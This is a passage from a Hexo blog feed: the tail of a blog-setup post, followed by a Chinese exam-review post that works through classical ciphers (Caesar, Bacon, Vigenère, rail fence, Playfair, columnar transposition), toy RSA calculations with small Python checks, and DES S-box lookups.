class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">文件内容格式：</span><br><span class="line">[&#123;</span><br><span class="line">    &quot;avatar&quot;: &quot;http://image.luokangyuan.com/1_qq_27922023.jpg&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;码酱&quot;,</span><br><span class="line">    &quot;introduction&quot;: &quot;我不是大佬，只是在追寻大佬的脚步&quot;,</span><br><span class="line">    &quot;url&quot;: &quot;http://luokangyuan.com/&quot;,</span><br><span class="line">    &quot;title&quot;: &quot;前去学习&quot;</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    &quot;avatar&quot;: &quot;http://image.luokangyuan.com/4027734.jpeg&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;闪烁之狐&quot;,</span><br><span class="line">    &quot;introduction&quot;: &quot;编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬&quot;,</span><br><span class="line">    &quot;url&quot;: &quot;https://blinkfox.github.io/&quot;,</span><br><span class="line">    &quot;title&quot;: &quot;前去学习&quot;</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    &quot;avatar&quot;: &quot;http://image.luokangyuan.com/avatar.jpg&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;ja_rome&quot;,</span><br><span class="line">    &quot;introduction&quot;: &quot;平凡的脚步也可以走出伟大的行程&quot;,</span><br><span class="line">    &quot;url&quot;: &quot;ttps://me.csdn.net/jlh912008548&quot;,</span><br><span class="line">    &quot;title&quot;: &quot;前去学习&quot;</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><p>关于后续的一些主题修改这位师傅写的比较详细：<a href="https://purethought.cn/c308959f.html">https://purethought.cn/c308959f.html</a><br>mastery主题搭建及优化：<a href="https://segmentfault.com/a/1190000021923137#item-6-32">https://segmentfault.com/a/1190000021923137#item-6-32</a><br>_config.yml文件讲解：<a href="https://hexo.io/zh-cn/docs/configuration">https://hexo.io/zh-cn/docs/configuration</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1、前期准备&quot;&gt;&lt;a href=&quot;#1、前期准备&quot; class=&quot;headerlink&quot; title=&quot;1、前期准备&quot;&gt;&lt;/a&gt;1、前期准备&lt;/h4&gt;&lt;p&gt;1.安装Git&lt;br&gt;windwows：&lt;a href=&quot;https://gitforwindows.org</summary>
      
    
    
    
    
    <category term="Hexo" scheme="http://blog.falsectf.top/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>考试复习</title>
    <link href="http://blog.falsectf.top/2020/02/07/ddf09cfd.html"/>
    <id>http://blog.falsectf.top/2020/02/07/ddf09cfd.html</id>
    <published>2020-02-07T05:01:47.000Z</published>
    <updated>2021-05-11T13:56:07.815Z</updated>
    
    <content type="html"><![CDATA[<h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><p>参考连接：<a href="https://howiezhao.github.io/2018/08/10/classical-crypto/">https://howiezhao.github.io/2018/08/10/classical-crypto/</a></p><h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>凯撒密码是单表替换密码，加密规则简单，主要分为两种，向右移动与向左移动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">例如：对Hello 进行加密，要求右移三位</span><br><span class="line">根据字母表将每个字母右移三位即可，大小写根据题目要求来写</span><br><span class="line">H -&gt; K</span><br><span class="line">e -&gt; h</span><br><span class="line">l -&gt; o</span><br><span class="line">l -&gt; o</span><br><span class="line">o -&gt; r</span><br><span class="line"></span><br><span class="line">经替换加密结果：Khoor，整体右移了三位</span><br><span class="line">解密方法与加密相反，左移三位即可</span><br><span class="line">移动13位是一个特例，也叫做ROT13加密，方法相同</span><br></pre></td></tr></table></figure><p>下方是一个移动一位与三位的对照表</p><p><img src="/images/crypto/%E5%87%AF%E6%92%92-1.png"></p><hr><h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>培根密码(Bacon’s cipher)加密时，明文中的每个字母都会转换成一组5个英文字母。(会有编码替换表)</p><p>例如加密：Hello</p><p><strong>常见</strong>加密后的形式为AB组成的字符串，<strong>长度为5的倍数</strong>，因为每个字母替换为对应的5个字母</p><p>明文<code>hello</code>的密文为<code>AABBBAABAAABABBABABBABBBA</code></p><p><strong>少见</strong>加密后形式：</p><p>例如给了一句英语短句，大写代表A，小写代表B，整体字母长度一定是5的倍数</p><p>或者是 加粗代表A，正常代表B等等</p><hr><h3 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h3><p>下方是加密替换表</p><p><img src="/images/crypto/vigenere.png"></p><p>这一表格包括了26行字母表，每一行都由前一行向左偏移1位得到。**<font color="ff0000">行为明文行，列为密钥列，密文位于表格内。</font>**</p><h4 id="加密规则："><a href="#加密规则：" class="headerlink" title="加密规则："></a>加密规则：</h4><p>​    例如加密明文：HELLOFALSE              密钥为FALSE</p><p>​    首先，取明文第一位H，取H行，然后取密钥第一位F，取F列 ——&gt; <strong>H行F列—&gt;M</strong></p><p>​    这样就将 <strong>H</strong> 替换为了 <strong>M</strong></p><p>​    其余的字母加密以此类推，<strong>注意：</strong>密钥长度小于明文长度时，循环使用。当E用完后右回到F继续循环。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">H行，F列 ——&gt; M</span><br><span class="line">E行，A列 ——&gt; E</span><br><span class="line">L行，L列 ——&gt; W</span><br><span class="line">L行，S列 ——&gt; D</span><br><span class="line">O行，E列 ——&gt; S</span><br><span class="line">F行，F列 ——&gt; K</span><br><span class="line">A行，A列 ——&gt; A</span><br><span class="line">L行，L列 ——&gt; W</span><br><span class="line">S行，S列 ——&gt; G</span><br><span class="line">E行，E列 ——&gt; I</span><br><span class="line">加密后的结果：MEWDSKAWGI</span><br></pre></td></tr></table></figure><h4 id="解密规则："><a href="#解密规则：" class="headerlink" title="解密规则："></a>解密规则：</h4><p><strong>此处解密有两种方法，基本没有差别</strong></p><p><code>1.查找密钥字母行，找到密文字母 ——&gt; 所对应的列就是明文字母</code></p><p><code>2.查找密钥字母列，找到密文字母 ——&gt; 所对应的行就是明文字母</code></p><p>（以上两种都是一位一位的取，循环取值找值即可）</p><p>首先取密钥第一个字母F，找到F行，取加密后第一个字母M，在F行种找到字母M ——&gt;找到F行字母M对应的列 ——&gt;H，即为解密结果</p><p>以此类推即可，密钥循环使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">密钥取F，密文取M，F行字母M对应的列为：H</span><br><span class="line">密钥取A，密文取E，A行字母E对应的列为：E</span><br><span class="line">密钥取L，密文取W，L行字母W对应的列为：L</span><br><span class="line">密钥取S，密文取D，S行字母D对应的列为：L</span><br><span class="line">密钥取E，密文取S，E行字母S对应的列为：O</span><br><span class="line">密钥取F，密文取K，F行字母K对应的列为：F</span><br><span class="line">密钥取A，密文取A，A行字母A对应的列为：A</span><br><span class="line">密钥取L，密文取W，L行字母W对应的列为：L</span><br><span class="line">密钥取S，密文取G，S行字母G对应的列为：S</span><br><span class="line">密钥取E，密文取I，E行字母I对应的列为：E</span><br><span class="line">这样就计算出了明文信息：HELLOFALSE</span><br></pre></td></tr></table></figure><h4 id="第二种算法"><a href="#第二种算法" class="headerlink" title="第二种算法"></a>第二种算法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">加密：</span><br><span class="line">1.将明文与密钥替换为对应26个字母的数字，从0开始到25</span><br><span class="line">2.取明文数字+对应位的密钥数字 mod 26 = 对应密文的数字</span><br><span class="line">3.根据密文数字找到对应字母即可</span><br><span class="line">解密：</span><br><span class="line">1.用密文字母对应数字 mod 26 - 密钥字母对应数字 = 明文字母</span><br><span class="line">（密钥长度小于明文长度时，循环使用）</span><br></pre></td></tr></table></figure><p><img src="/images/crypto/vigenere-2.png"></p><hr><h3 id="栅栏密码–置换密码"><a href="#栅栏密码–置换密码" class="headerlink" title="栅栏密码–置换密码"></a>栅栏密码–置换密码</h3><p>栅栏密码(Rail fence cipher)，就是把要加密的明文分成n个一组，然后把每组的第一个字连起来，紧接着把每组的第二个字连起来，以此类推，形成一段无规律的话。</p><h4 id="加密规则"><a href="#加密规则" class="headerlink" title="加密规则"></a>加密规则</h4><p>例如加密数据：Hello False</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">假如分为2组，5个字母一组</span><br><span class="line">Hello</span><br><span class="line">False</span><br><span class="line">取每组的第一个字母组合：HF</span><br><span class="line">取每组的第二个字母组合：ea</span><br><span class="line">取每组的第三个字母组合：ll</span><br><span class="line">取每组的第四个字母组合：ls</span><br><span class="line">取每组的第五个字母组合：oe</span><br><span class="line">加密结果：HFeal llsoe</span><br></pre></td></tr></table></figure><h4 id="解密规则"><a href="#解密规则" class="headerlink" title="解密规则"></a>解密规则</h4><p>正确方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.去掉空格：HFealllsoe</span><br><span class="line">2.分成5栏：HF、ea、ll、ls、oe</span><br><span class="line">3.取出每栏第1个字母：Hello</span><br><span class="line">4.取出每栏第2个字母：False</span><br><span class="line">4.依次类推</span><br><span class="line">5.连在一起：HelloFalse</span><br><span class="line">6.加上适当空格：Hello False</span><br></pre></td></tr></table></figure><p>注意：这里栅栏的栏数取决于n的取值，一般而言，<strong>n要整除字母数，n不可能大于或等于字母数</strong>，当不知道n为多少时，可采用穷举法一个个试。</p><p>小技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">根据上述密文：HFeal llsoe</span><br><span class="line">因为加密时是将数据分为了两组，所以这里依次取值排成两组即可</span><br><span class="line">H F</span><br><span class="line">e a</span><br><span class="line">l l</span><br><span class="line">l s</span><br><span class="line">o e</span><br><span class="line">竖着读一下就能知道明文了：Hello False</span><br></pre></td></tr></table></figure><hr><h3 id="Playfair-密码"><a href="#Playfair-密码" class="headerlink" title="Playfair 密码"></a>Playfair 密码</h3><p>推荐B站UP视频讲解：<a href="https://www.bilibili.com/video/BV1zE411i7TU">https://www.bilibili.com/video/BV1zE411i7TU</a></p><p>普莱费尔密码（英文：Playfair cipher 或 Playfair square）是一种使用一个关键词方格来加密字符对的加密法，1854年由<a href="https://baike.baidu.com/item/%E4%B8%80%E4%BD%8D%E5%90%8D%E5%8F%AB%E6%9F%A5%E5%B0%94%E6%96%AF%C2%B7%E6%83%A0%E6%96%AF%E9%80%9A/10168121">一位名叫查尔斯·惠斯通</a>（Charles</p><p> Wheatstone）的英国人发明。</p><p><strong>加密算法：</strong></p><p><u>该加密算法可横向填充也可纵向填充，下方列举的是横向填充。</u></p><p><strong>第一步：编制密码表</strong></p><p>首先，编制一个5*5大小的表格，用于存放密钥</p><p>一共有26个字母，为什么用5*5的方格呢？因为大写i和大写j被当作一个字母来看。</p><p>密钥填充的规则如下：</p><p>​    从左向右从上向下依次填充密钥的字母，如果遇到重复字母将其跳过填充密钥的下一个字母，直至密钥全部填充到5<em>5的放格中，如果未填满，按照字母表的顺序，从A-Z依次将未出现的字母填充至5</em>5的方格中，直至填满为止，现在方格中填满了25个无重复的字母。</p><p>​    当填充i或j的时候表示：i(j)  或 i/j  注意是大写！</p><p>举例：</p><p>​    密钥为False test Playfair cipher</p><table><thead><tr><th>F</th><th>A</th><th>L</th><th>S</th><th>E</th></tr></thead><tbody><tr><td>T</td><td>P</td><td>V</td><td>I/J或I(J)</td><td>R</td></tr><tr><td>C</td><td>H</td><td>B</td><td>D</td><td>G</td></tr><tr><td>K</td><td>M</td><td>N</td><td>O</td><td>Q</td></tr><tr><td>U</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr></tbody></table><p>到这里，我们的密钥填充完毕了，可以发现密钥中重复的字符只记录第一次出现,重复出现跳过，从B字符开始就已经填充完毕密钥了，后面按照字母表顺序进行填充(当然要跳过已经出现的字母)。</p><p><strong>第二步：整理明文,进行加密</strong></p><p>一般情况：</p><p>假如我要加密明文字符串：Falseabd</p><p>先将字符串分为两两一组：Fa,ls,ea,bz</p><p>然后每一组去按照表格进行加密替换，替换规则如下：</p><p>​    <strong>明文两个字母相同行时：</strong></p><p>​    Fa,ls,ea都是在表格的同一行中，他们的替换规则相同——&gt;根据矩阵替换为该字母的下一个字母</p><p>​    Fa ——&gt; AL</p><p>​    ls  ——&gt; SE</p><p>​    <font color="ff0000">ea ——&gt; FL</font></p><p><font color="ff0000"> 注意：在根据矩阵密钥进行替换时，如果遇到该行最后一个字符，不去下一行进行查找，而是该行第一个开始循环</font></p><p><strong>明文两个字母不同行时：</strong></p><p>这里B与Z互为对角，找到两个值相连组成的表格如下</p><table><thead><tr><th><font color="ff0000">B</font></th><th>D</th><th>G</th></tr></thead><tbody><tr><td>N</td><td>O</td><td>Q</td></tr><tr><td>X</td><td>Y</td><td><font color="ff0000">Z</font></td></tr></tbody></table><p>可以发现，B同行另一侧是G，Z同行另一侧是X  替换：bz——&gt;GX</p><p>最后加密的字符串为：ALSEAEGX   均为大写</p><p><strong>特殊情况：</strong></p><p>特殊情况在视频的11：38处开始</p><p><strong>1.加密明文中存在 aabc类型时</strong></p><p>此时，可以分为两组：aa,bc</p><p><del>按照上面的一般规则应该替换为：aa——&gt;LL , bc——&gt;DH</del>    这种方法是错误的</p><p>这里用到方法：<font color="ff0000">同插缺补</font> 出自UP视频</p><p>这里明文是aabc，aa相同，所以采用<font color="ff0000">同插</font>方法</p><p>​    将aa中间插入一个其他字符，按照字母表的顺序，A-Z，A不行，与aa再次相同，所以这里选用B</p><p>​    所以原明文变为：ababc  分组——&gt; ab,ab,c</p><p><strong>2.加密明文字符串长度为奇数时</strong></p><p>这里可以根据1中的同插后发现字符长度变为了奇数，两两分组时出现了单个的情况</p><p>这里采用<font color="ff0000">缺补</font>的方法：</p><p>ab,ab,c  在c的后面插入一个字符，同样按照字母表A-Z的顺序，只要出现第一个与c不同字符即可</p><p>ab,ab,c  ——&gt; ab,ab,ca ，可以发现在补a的情况就已经满足了，无需再补了</p><p>之后的加密方法同上的一般方法进行加密即可</p><p>解密方法就是加密方法的逆过程</p><p><strong>总结：</strong></p><p>解密规则</p><p> （1） 若c1 c2在同一行，对应明文p1 p2分别是紧靠c1 c2 左端的字母。其中最后一列被看做是第一列的左方。</p><p> （2） 若c1 c2在同一列，对应明文p1 p2分别是紧靠c1 c2 上方的字母。其中最后一行被看做是第一行的上方。</p><p> （3）若c1 c2不在同一行，不在同一列，则p1 p2是由c1 c2确定的矩形的其他两角的字母。</p><p>加密规则</p><p> （1）若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。</p><p> （2） 若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。</p><p> （3）若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。</p><p>参考：<a href="https://www.cnblogs.com/xdjun/p/7469841.html">https://www.cnblogs.com/xdjun/p/7469841.html</a></p><p>例题举例：</p><p><img src="/images/crypto/%E5%AF%86%E7%A0%811.png"></p><p>1.创建密钥矩阵如下，按照规则，字母全是大写</p><table><thead><tr><th>R</th><th>O</th><th>Y</th><th>A</th><th>L</th></tr></thead><tbody><tr><td>N</td><td>E</td><td>W</td><td>Z</td><td>D</td></tr><tr><td>V</td><td><font color="ff0000">B</font></td><td>C</td><td>F</td><td>G</td></tr><tr><td>H</td><td>I/J</td><td>K</td><td>M</td><td>P</td></tr><tr><td>Q</td><td>S</td><td>T</td><td>U</td><td>X</td></tr></tbody></table><p>答案如上图所示，从B开始为按照字母表顺序填充，跳过已经出现的重复字符</p><p>2.这里题目说分组方式为每组一个字母，按列循环，右移三格</p><h3 id="矩阵（列）换位密码"><a href="#矩阵（列）换位密码" class="headerlink" title="矩阵（列）换位密码"></a>矩阵（列）换位密码</h3><p>解题思路总结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.查看题目给的密钥是不是数字的</span><br><span class="line">是——&gt;直接画表，列为密钥数字，将明文信息横向填入表格中</span><br><span class="line">否——&gt;将密钥字母转换为数字的格式，查找其在字母表中优先出现的次序</span><br><span class="line">2.输出加密结果：</span><br><span class="line">从第 1 列开始，竖着读，进行输出 以此类推</span><br><span class="line">(横向输入，纵向输出)</span><br></pre></td></tr></table></figure><p><img src="/images/crypto/%E5%AF%86%E7%A0%812.png"></p><p>解题如下</p><p>1.首先是画出表格，列为621354</p><p>然后根据题目要求将明文填入（横向填入）</p><table><thead><tr><th>6</th><th>2</th><th>1</th><th>3</th><th>5</th><th>4</th></tr></thead><tbody><tr><td>T</td><td>H</td><td>E</td><td>W</td><td>O</td><td>R</td></tr><tr><td>L</td><td>D</td><td>O</td><td>W</td><td>E</td><td>S</td></tr><tr><td>Y</td><td>O</td><td>U</td><td>N</td><td>O</td><td>T</td></tr><tr><td>H</td><td>I</td><td>N</td><td>G</td><td>I</td><td>T</td></tr><tr><td>W</td><td>A</td><td>S</td><td>H</td><td>E</td><td>R</td></tr><tr><td>E</td><td>F</td><td>I</td><td>R</td><td>S</td><td>T</td></tr></tbody></table><p>2.明文填入已经完成，接下来按列读取即可，从第<strong>1</strong>列开始，竖着读</p><p>EOUNSI HDOIAF WWNGHR RSTTRT OEOIES TLYHWE   中间空格可以去掉，根据题目要求来</p><p><strong>注意：</strong>如果加密密钥不是直接给的数字，而是单词，例如：study</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">首先对密钥 study 在字母表优先出现的次序进行排序：</span><br><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line">s-&gt;2</span><br><span class="line">t-&gt;3</span><br><span class="line">u-&gt;4</span><br><span class="line">d-&gt;1</span><br><span class="line">y-&gt;5</span><br><span class="line">(study中，d在字母表的最前面所以是1，以此类推)</span><br><span class="line">所以密钥为study时，等价于密钥为23415，按照23415列换位加密即可</span><br></pre></td></tr></table></figure><p><img src="/images/crypto/%E5%88%97%E6%8D%A2%E4%BD%8D1.png"></p><hr><h3 id="螺旋置换"><a href="#螺旋置换" class="headerlink" title="螺旋置换"></a>螺旋置换</h3><p><img src="/images/crypto/%E8%9E%BA%E6%97%8B%E7%BD%AE%E6%8D%A2.png"></p><h3 id="RSA加密与解密"><a href="#RSA加密与解密" class="headerlink" title="RSA加密与解密"></a>RSA加密与解密</h3><p>简单原理如下图</p><p><img src="/images/crypto/RSA.png"></p><p>c:明文，m:密文</p><p>RSA加密过程：c = m ^ e mod n         加密用公钥e</p><p>RSA解密过程：m = c ^ d mod n         解密用私钥d</p><p>例题：RSA 是典型的公钥密码体制，现截获某用户使用公钥加密并发送的密文为 9，公钥 e 为 13，p=17， q=5，试求出私钥 d 和用户发送的明文。 </p><p>根据上面公式<strong>求d</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=p*q</span><br><span class="line">φ(n)=(p-1)*(q-1)</span><br><span class="line">de mod φ(n)=1</span><br><span class="line">d*13%64=1</span><br><span class="line">所以可以推算出d=5   或(64+1)/13=5</span><br></pre></td></tr></table></figure><p>验证脚本，需要安装gmpy2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p,q,e = gmpy2.mpz(<span class="number">17</span>),gmpy2.mpz(<span class="number">5</span>),gmpy2.mpz(<span class="number">13</span>)</span><br><span class="line">L = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,L)</span><br><span class="line"><span class="built_in">print</span> d</span><br></pre></td></tr></table></figure><p>d求完了，接下来是<strong>求明文m</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = c^d mod n</span><br><span class="line"></span><br><span class="line">c=9,d=5,n=p*q=85</span><br><span class="line"></span><br><span class="line">所以 m = 9^5 % 85=59</span><br><span class="line">9^5=59049   59049/85=694   59049-694*85=59</span><br></pre></td></tr></table></figure><p>验证脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">9</span></span><br><span class="line">d=<span class="number">5</span></span><br><span class="line">n=<span class="number">17</span>*<span class="number">5</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span> m</span><br></pre></td></tr></table></figure><hr><p><strong>RSA加密</strong></p><p>例：p=17,q=5,e=3,m=12请求出加密后的c</p><p>这里e给的比较小，方便口算掌握原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> n = p*q</span><br><span class="line">根据 c = pow(m,e,n)  对m进行加密</span><br><span class="line"></span><br><span class="line">c = m ^ e % n</span><br><span class="line">  = 12^3 % 85</span><br><span class="line">  =28</span><br></pre></td></tr></table></figure><p>脚本验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">m = <span class="number">12</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">17</span>*<span class="number">5</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)  <span class="comment">#   m ^ e % n</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;密文c=&quot;</span>,c <span class="comment">#28</span></span><br></pre></td></tr></table></figure><hr><p><strong>RSA求公钥与私钥</strong></p><p>问题：令p=3 , q=11,求公钥(e,n)，私钥(d,n)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">分析：</span><br><span class="line">已知p和q可以推出n，f(n)</span><br><span class="line">没有给出e，从3,5,7开始逐个取选取一个合适的</span><br><span class="line">利用d,e,f(n)求出d</span><br></pre></td></tr></table></figure><p>注意：<strong>f(n)与e互质</strong>，计算如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.求n：n=p*q=33</span><br><span class="line">2.求f(n)：f(n)=(p-1) * (q-1) = 20</span><br><span class="line">3.设(取)e=3,因为3与f(n) 20互质</span><br><span class="line">4.根据公式：de = 1 mod f(n)</span><br><span class="line">  d*3 = 1 mod 20    (可以理解为3*d%20=1)</span><br><span class="line">  ——&gt; d=7</span><br><span class="line">5.所以 公钥(e,n)=(3,33)，私钥(d,n)=(7,33)</span><br></pre></td></tr></table></figure><hr><h3 id="EDS-S盒"><a href="#EDS-S盒" class="headerlink" title="EDS-S盒"></a>EDS-S盒</h3><p>在密码学中，S盒(Substitution-box)是对称密钥算法执行置换计算的基本结构。S盒用在分组密码算法中，是唯一的<strong>非线性结构</strong>，其S盒的指标的好坏直接决定了密码算法的好坏。</p><p>每组S盒是由长16宽4组成的一个矩形</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">下方例题考察是S盒问题，输入6位，输出4位</span><br><span class="line"></span><br><span class="line">1.将输入的6位二进制数取头尾组合算出对应十进制</span><br><span class="line"></span><br><span class="line">2.将输入的6位二进制数取中间4位算出对应十进制</span><br><span class="line"></span><br><span class="line">3.用第一和第二步算出的两个值当作点坐标(1，2) 去对应盒中查找坐标对应的十进制数值</span><br><span class="line"></span><br><span class="line">4.将十进制转化为对应的二进制数，即为该盒输入4位二进制数对应的输出</span><br><span class="line">这样，就输出了每组S盒 输入值对应的9个二进制数,也就是替换后的值</span><br></pre></td></tr></table></figure><p><img src="/images/crypto/DES.png"></p><p>参考链接：<a href="https://www.cnblogs.com/wangccc/p/5385695.html">https://www.cnblogs.com/wangccc/p/5385695.html</a></p><p>这里一共有5个盒，将表格截取为五个小表格，不包含S1-S5所在行</p><p><img src="/images/crypto/DES1.png"></p><p>如上图，为S1盒，输入为110010，根据上方博客链接的方法</p><p>1.取输入数据头尾：10（二进制）——&gt; 2（十进制）    2行</p><p>2.取输入数据中间：1001（二进制）——&gt; 9（十进制） 9列</p><p>根据1 2步取出的坐标值(2，9)，找到对应的数据为12</p><p>3.将值12转化为二进制=1100，S1输出结果为1100</p><p>则S1对应输出为：1100</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S1(110010)=S1(10,1001)=S1(2,9)=12=1100</span><br></pre></td></tr></table></figure><hr><p>求S2，S2输入：010011</p><p><img src="/images/crypto/DES2.png"></p><p>同上方法</p><p>1.取输入数据头尾：01——&gt; 1   1行</p><p>2.取输入数据中间：1001——&gt; 9 列</p><p>根据1 2步取出的坐标值(1，9)，找到对应的数据为0</p><p>3.将值0转化为二进制=0，S2输出结果为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2(010011)=S1(01,1001)=S1(1,9)=0=0000</span><br></pre></td></tr></table></figure><hr><p>求S3，S3输入：101011</p><p><img src="/images/crypto/DES3.png"></p><p>1.取输入数据头尾：11（二进制）——&gt; 3（十进制）  3行</p><p>2.取输入数据中间：0101（二进制）——&gt; 5（十进制）5列</p><p>根据1 2步取出的坐标值(3，5)，找到对应的数据为9</p><p>3.将值9转化为二进制=1001，S3输出结果为1001</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S3(101011)=S3(11,0101)=S3(3,5)=9=1001</span><br></pre></td></tr></table></figure><hr><p>求S4，S4输入：111001</p><p><img src="/images/crypto/DES4.png"></p><p>1.取输入数据头尾：11（二进制）——&gt; 3（十进制）  3行</p><p>2.取输入数据中间：1100（二进制）——&gt; 12（十进制）12列</p><p>根据1 2步取出的坐标值(3，12)，找到对应的数据为12</p><p>3.将值12转化为二进制=1100，S4输出结果为1100</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 